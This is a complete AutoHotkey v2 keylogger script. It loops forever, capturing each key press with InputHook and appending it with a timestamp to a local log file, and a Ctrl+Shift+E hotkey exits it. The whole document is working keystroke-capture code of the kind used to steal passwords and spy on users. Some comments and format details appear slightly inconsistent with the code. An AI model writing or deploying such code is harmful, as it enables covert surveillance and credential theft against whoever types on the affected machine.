#Requires AutoHotkey v2.0
; Define the log file path
logFile := "PATH\keylog.txt"

; Ensure the log file exists
FileAppend("", logFile)

; Function to log key presses
logKey(key) {
    global logFile
    ; Append the key pressed to the log file with a timestamp
    FileAppend(Format("{:T}: {}`n", A_Now, key), logFile)
}

; Main loop to capture all key presses
while true {
    input := InputHook("L1 T0 V", "{All}") ; L1 = one key, T0 = no timeout, V = visible
    input.Start()                         ; Start capturing input
    input.Wait()                          ; Wait for a key press
    key := input.Input                    ; Use EndKey to capture the key name
    if (key != "") {
        logKey(key)                       ; Log the captured key
    }
}

; Define a hotkey to exit the script gracefully (Ctrl+Shift+E)
^+e::ExitApp